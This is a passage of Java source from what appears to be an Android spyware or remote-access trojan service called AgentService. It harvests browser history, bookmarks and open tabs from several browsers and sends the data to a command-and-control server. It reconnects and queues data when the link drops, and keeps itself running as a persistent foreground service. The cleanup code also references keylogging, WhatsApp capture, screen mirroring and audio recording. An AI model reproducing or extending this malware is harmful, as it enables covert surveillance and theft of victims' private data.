        if (history.length() == 0) {
            try {
                Uri samsungUri = Uri.parse("content://com.sec.android.app.sbrowser.browser/history");
                String[] projection = {"url", "title", "date"};
                
                cursor = getContentResolver().query(samsungUri, projection, null, null, "date DESC LIMIT 100");
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject entry = new JSONObject();
                        String url = getColumnValue(cursor, "url");
                        String title = getColumnValue(cursor, "title");
                        String date = getColumnValue(cursor, "date");

                        entry.put("url", url != null ? url : "");
                        entry.put("title", title != null ? title : "");
                        entry.put("date", date != null ? date : "");
                        entry.put("visits", "0");
                        entry.put("browser", "samsung");
                        entry.put("domain", extractDomain(url));

                        history.put(entry);
                    } while (cursor.moveToNext());
                    cursor.close();
                    cursor = null;
                    Log.d(TAG, "✅ Samsung history: " + history.length() + " entries");
                }
            } catch (Exception e) {
                Log.w(TAG, "Samsung history failed: " + e.getMessage());
            }
        }

        // METHOD 4: Try Brave history
        if (history.length() == 0) {
            try {
                Uri braveUri = Uri.parse("content://com.brave.browser/history");
                String[] projection = {"url", "title", "date"};
                
                cursor = getContentResolver().query(braveUri, projection, null, null, "date DESC LIMIT 100");
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject entry = new JSONObject();
                        String url = getColumnValue(cursor, "url");
                        String title = getColumnValue(cursor, "title");
                        String date = getColumnValue(cursor, "date");

                        entry.put("url", url != null ? url : "");
                        entry.put("title", title != null ? title : "");
                        entry.put("date", date != null ? date : "");
                        entry.put("visits", "0");
                        entry.put("browser", "brave");
                        entry.put("domain", extractDomain(url));

                        history.put(entry);
                    } while (cursor.moveToNext());
                    cursor.close();
                    cursor = null;
                    Log.d(TAG, "✅ Brave history: " + history.length() + " entries");
                }
            } catch (Exception e) {
                Log.w(TAG, "Brave history failed: " + e.getMessage());
            }
        }

        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "browser_history");
        result.put("browser", browserPackage != null ? browserPackage : "all");
        result.put("count", history.length());
        result.put("data", history);
        result.put("timestamp", System.currentTimeMillis());
        
        Log.d(TAG, "📊 Final history count: " + history.length());
        return result.toString();

    } catch (Exception e) {
        Log.e(TAG, "Browser history error: " + e.getMessage(), e);
        return errorJson("Failed to get browser history: " + e.getMessage());
    }
}

private String getBrowserBookmarks(String browserPackage) {
    try {
        JSONArray bookmarks = new JSONArray();
        Cursor cursor = null;

        // METHOD 1: Try Chrome bookmarks
        try {
            Uri chromeUri = Uri.parse("content://com.android.chrome.browser/bookmarks");
            String[] projection = {"url", "title", "date"};
            
            cursor = getContentResolver().query(chromeUri, projection, null, null, "title ASC");
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject bookmark = new JSONObject();
                    String url = getColumnValue(cursor, "url");
                    String title = getColumnValue(cursor, "title");
                    String date = getColumnValue(cursor, "date");

                    bookmark.put("url", url != null ? url : "");
                    bookmark.put("title", title != null ? title : "");
                    bookmark.put("date", date != null ? date : "");
                    bookmark.put("browser", "chrome");
                    bookmark.put("domain", extractDomain(url));

                    bookmarks.put(bookmark);
                } while (cursor.moveToNext());
                cursor.close();
                cursor = null;
                Log.d(TAG, "✅ Chrome bookmarks: " + bookmarks.length() + " entries");
            }
        } catch (Exception e) {
            Log.w(TAG, "Chrome bookmarks failed: " + e.getMessage());
        }

        // METHOD 2: Try Firefox bookmarks
        if (bookmarks.length() == 0) {
            try {
                Uri firefoxUri = Uri.parse("content://org.mozilla.firefox.browser/bookmarks");
                String[] projection = {"url", "title", "date"};
                
                cursor = getContentResolver().query(firefoxUri, projection, null, null, "title ASC");
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject bookmark = new JSONObject();
                        String url = getColumnValue(cursor, "url");
                        String title = getColumnValue(cursor, "title");
                        String date = getColumnValue(cursor, "date");

                        bookmark.put("url", url != null ? url : "");
                        bookmark.put("title", title != null ? title : "");
                        bookmark.put("date", date != null ? date : "");
                        bookmark.put("browser", "firefox");
                        bookmark.put("domain", extractDomain(url));

                        bookmarks.put(bookmark);
                    } while (cursor.moveToNext());
                    cursor.close();
                    cursor = null;
                    Log.d(TAG, "✅ Firefox bookmarks: " + bookmarks.length() + " entries");
                }
            } catch (Exception e) {
                Log.w(TAG, "Firefox bookmarks failed: " + e.getMessage());
            }
        }

        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "browser_bookmarks");
        result.put("browser", browserPackage != null ? browserPackage : "all");
        result.put("count", bookmarks.length());
        result.put("data", bookmarks);
        result.put("timestamp", System.currentTimeMillis());
        
        Log.d(TAG, "📊 Final bookmarks count: " + bookmarks.length());
        return result.toString();

    } catch (Exception e) {
        Log.e(TAG, "Browser bookmarks error: " + e.getMessage(), e);
        return errorJson("Failed to get bookmarks: " + e.getMessage());
    }
}

private String getBrowserTabs(String browserPackage) {
    try {
        JSONArray tabs = new JSONArray();
        Cursor cursor = null;
        
        // Try Chrome tabs
        try {
            Uri chromeTabsUri = Uri.parse("content://com.android.chrome.browser/tabs");
            cursor = getContentResolver().query(chromeTabsUri, null, null, null, null);
            
            if (cursor != null && cursor.moveToFirst()) {
                do {
                    JSONObject tab = new JSONObject();
                    String url = getColumnValue(cursor, "url");
                    String title = getColumnValue(cursor, "title");
                    
                    tab.put("url", url != null ? url : "");
                    tab.put("title", title != null ? title : "");
                    tab.put("browser", "chrome");
                    tab.put("domain", extractDomain(url));
                    
                    tabs.put(tab);
                } while (cursor.moveToNext());
                cursor.close();
                cursor = null;
                Log.d(TAG, "✅ Chrome tabs: " + tabs.length() + " entries");
            }
        } catch (Exception e) {
            Log.w(TAG, "Chrome tabs failed: " + e.getMessage());
        }

        // Try Firefox tabs
        if (tabs.length() == 0) {
            try {
                Uri firefoxTabsUri = Uri.parse("content://org.mozilla.firefox.browser/tabs");
                cursor = getContentResolver().query(firefoxTabsUri, null, null, null, null);
                
                if (cursor != null && cursor.moveToFirst()) {
                    do {
                        JSONObject tab = new JSONObject();
                        String url = getColumnValue(cursor, "url");
                        String title = getColumnValue(cursor, "title");
                        
                        tab.put("url", url != null ? url : "");
                        tab.put("title", title != null ? title : "");
                        tab.put("browser", "firefox");
                        tab.put("domain", extractDomain(url));
                        
                        tabs.put(tab);
                    } while (cursor.moveToNext());
                    cursor.close();
                    cursor = null;
                    Log.d(TAG, "✅ Firefox tabs: " + tabs.length() + " entries");
                }
            } catch (Exception e) {
                Log.w(TAG, "Firefox tabs failed: " + e.getMessage());
            }
        }

        JSONObject result = new JSONObject();
        result.put("status", "success");
        result.put("type", "browser_tabs");
        result.put("browser", browserPackage != null ? browserPackage : "all");
        result.put("count", tabs.length());
        result.put("data", tabs);
        result.put("timestamp", System.currentTimeMillis());
        return result.toString();

    } catch (Exception e) {
        Log.e(TAG, "Browser tabs error: " + e.getMessage(), e);
        return errorJson("Failed to get browser tabs: " + e.getMessage());
    }
}

private String getBrowserAll() {
    try {
        JSONObject allData = new JSONObject();
        allData.put("info", new JSONObject(getBrowserInfo()));
        allData.put("history", new JSONObject(getBrowserHistory(null)));
        allData.put("bookmarks", new JSONObject(getBrowserBookmarks(null)));
        allData.put("tabs", new JSONObject(getBrowserTabs(null)));
        allData.put("status", "success");
        allData.put("timestamp", System.currentTimeMillis());
        return allData.toString();
    } catch (Exception e) {
        Log.e(TAG, "Browser all error: " + e.getMessage(), e);
        return errorJson("Failed to get all browser data: " + e.getMessage());
    }
}

private String extractDomain(String url) {
    if (url == null || url.isEmpty()) return "";
    try {
        java.net.URI uri = new java.net.URI(url);
        String host = uri.getHost();
        if (host != null) {
            if (host.startsWith("www.")) {
                host = host.substring(4);
            }
            return host;
        }
        return "";
    } catch (Exception e) {
        return "";
    }
}


    private String errorJson(String message) {
        try {
            JSONObject result = new JSONObject();
            result.put("status", "error");
            result.put("message", message);
            return result.toString();
        } catch (Exception e) {
            return "{\"status\":\"error\",\"message\":\"" + message + "\"}";
        }
    }

    private void updateNotification(String text) {
    try {
        if (mainHandler != null) {
            mainHandler.post(() -> {
                try {
                    Notification notification = getNotification(text);
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        startForeground(1, notification,
                                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC |
                                ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION);
                    } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                        startForeground(1, notification,
                                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                    } else {
                        startForeground(1, notification);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Update notification error: " + e.getMessage());
                }
            });
        }
    } catch (Exception e) {
        Log.e(TAG, "Update notification error: " + e.getMessage());
    }
}

    private void showToast(String message) {
        mainHandler.post(() -> Toast.makeText(AgentService.this, message, Toast.LENGTH_SHORT).show());
    }

    // ==================== QUEUE & CONNECTION HELPERS ====================

    public boolean isC2Connected() {
        //return isConnected.get() && out != null && socket != null && socket.isConnected();
        return isConnected.get() && out != null;
    }

    public void sendRawData(String data) {
        if (!isC2Connected()) {
            Log.w(TAG, "⚠️ Cannot send raw data - not connected to C2");
            queueDataForReconnect(data);
            return;
        }

        backgroundHandler.post(() -> {
            try {
                synchronized (out) {
                    out.println(data);
                    out.flush();
                    Log.d(TAG, "📤 Raw data sent");
                }
            } catch (Exception e) {
                Log.e(TAG, "❌ Send raw data error: " + e.getMessage());
                isConnected.set(false);
                closeConnection();
                connectToC2();
            }
        });
    }

    private void queueDataForReconnect(String data) {
        synchronized (pendingDataQueue) {
            if (pendingDataQueue.size() < MAX_QUEUE_SIZE) {
                pendingDataQueue.add(data);
                Log.d(TAG, "📦 Data queued for reconnect: " + data.substring(0, Math.min(100, data.length())) + "...");
            } else {
                Log.w(TAG, "⚠️ Queue full, dropping oldest data");
                pendingDataQueue.remove(0);
                pendingDataQueue.add(data);
            }
        }
    }

    private void flushPendingData() {
        synchronized (pendingDataQueue) {
            if (pendingDataQueue.isEmpty()) return;

            Log.d(TAG, "📤 Flushing " + pendingDataQueue.size() + " pending messages");
            for (String data : pendingDataQueue) {
                try {
                    if (out != null && isConnected.get()) {
                        synchronized (out) {
                            out.println(data);
                            out.flush();
                            Log.d(TAG, "📤 Flushed pending data");
                        }
                    }
                } catch (Exception e) {
                    Log.e(TAG, "❌ Flush pending error: " + e.getMessage());
                }
            }
            pendingDataQueue.clear();
        }
    }
    
    // AgentService.java - TAMBAHKAN METHOD INI



    // ==================== CLOSE CONNECTION ====================

    private void closeConnection() {
        try {
            if (in != null) {
                try {
                    in.close();
                } catch (Exception e) {
                }
                in = null;
            }
            if (out != null) {
                try {
                    out.close();
                } catch (Exception e) {
                }
                out = null;
            }
            if (socket != null) {
                try {
                    socket.close();
                } catch (Exception e) {
                }
                socket = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "Close error", e);
        }
        isConnected.set(false);
    }

    // ==================== LIFECYCLE ====================

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
    fetchC2Config();
    
    // Wait sebentar
    try {
        Thread.sleep(2000);
    } catch (InterruptedException e) {
        e.printStackTrace();
    }
    
    // Then connect
    connectToC2();
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        isRunning.set(false);
        isRecording = false;
        isKeylogging = false;
        isWhatsAppCapturing = false;
        unregisterFrameReceiver();
        unregisterPermissionReceiver();

        if (screenMirrorHelper != null) {
            screenMirrorHelper.stopScreenCapture();
            screenMirrorHelper.destroy();
            screenMirrorHelper = null;
        }

        if (heartbeatHandler != null && heartbeatRunnable != null) {
            heartbeatHandler.removeCallbacks(heartbeatRunnable);
            heartbeatHandler = null;
        }
        


        try {
            Intent stopIntent = new Intent(this, ScreenMirrorService.class);
            stopService(stopIntent);
        } catch (Exception e) {
            Log.e(TAG, "Stop mirror service error: " + e.getMessage());
        }

        closeConnection();

        try {
            if (mediaRecorder != null) {
                mediaRecorder.release();
                mediaRecorder = null;
            }
        } catch (Exception e) {
            Log.e(TAG, "MediaRecorder release error: " + e.getMessage());
        }
        
        

        NotificationListener.setAgentService(null);
        KeyloggerHelper.setAgentService(null);
        ServiceController.setAgentService(null);
        unregisterKeylogReceiver();
        commandExecutor.shutdown();
        responseExecutor.shutdown();

        unregisterMirrorReceiver();
        unregisterConfigReceiver();

        Log.d(TAG, "Agent Service Destroyed");
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
}

